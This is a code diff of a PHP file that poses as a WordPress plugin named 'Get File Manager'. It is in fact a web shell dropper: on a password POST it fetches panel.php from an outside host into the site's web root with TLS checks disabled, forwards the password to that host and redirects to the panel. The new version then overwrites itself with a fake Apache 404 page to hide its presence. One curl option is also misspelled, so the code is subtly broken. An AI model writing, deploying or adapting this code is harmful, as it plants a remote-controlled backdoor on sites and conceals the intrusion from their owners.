@@ -1,10 +1,8 @@
 <?php
 /*
- * Plugin Name: Get The Panel
- * Version: 1.0.0
+ * Plugin Name: Get File Manager
+ * Version: 1.0.1
  * Author: VinhNoName
- * License: GPLv3
- * License URI: http://www.gnu.org/licenses/gpl-3.0
 */
 if(isset($_SERVER['DOCUMENT_ROOT']) && !empty($_SERVER['DOCUMENT_ROOT'])) $root=$_SERVER['DOCUMENT_ROOT'];
 else if(isset($_SERVER['SCRIPT_FILENAME']) && !empty($_SERVER['SCRIPT_FILENAME'])) $root=$_SERVER['SCRIPT_FILENAME'];
@@ -17,14 +15,14 @@ unset($posi);
 if(!empty($_POST['pass'])){
 $panel=$root.'/panel.php';
 if(is_file($panel)) unlink($panel);
-$password=md5('VinhNoName:'.md5($_POST['pass']));
 $fp=fopen($panel,'w');
 $ch=curl_init();
-curl_setopt($ch,CURLOPT_URL,'http://v-vinhjaxt.rhcloud.com/panel.php?tai=panel.php');
+curl_setopt($ch,CURLOPT_URL,'https://v-vinhjaxt.rhcloud.com/panel.php?tai=panel.php');
 curl_setopt($ch,CURLOPT_USERAGENT,$_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);
 curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);
-curl_setopt($ch,CURLOPT_COOKIE,'php_id='.$password);
+curl_setopt($ch,CURLOPT_POST,1);
+curl_setopt($ch,CURLOPT_POSTFILEDS,array('pass'=>$_POST['pass']));
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
 curl_setopt($ch, CURLOPT_MAXREDIRS, 20);
 curl_setopt($ch,CURLOPT_FILE,$fp);
@@ -33,11 +31,10 @@ curl_close($ch);
 fclose($fp);
 unset($ch);
 unset($fp);
-if(strpos(file_get_contents($panel),'?php')!==false){
-setcookie('php_id', $password, time() + 3600 * 24 * 365, '/');
+if(strpos(file_get_contents($panel),'<?php')!==false){
 header('Location: /panel.php');
 echo '<script>location.href="/panel.php";</script>';
-unlink(__FILE__);
+file_put_contents(__FILE__,'<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL /index.php was not found on this server.</p><hr><address>Apache/2.2.15 Server at '.$_SERVER['HTTP_HOST'].' Port 80</address></body></html>');
 exit;
 }}
 ?><html>
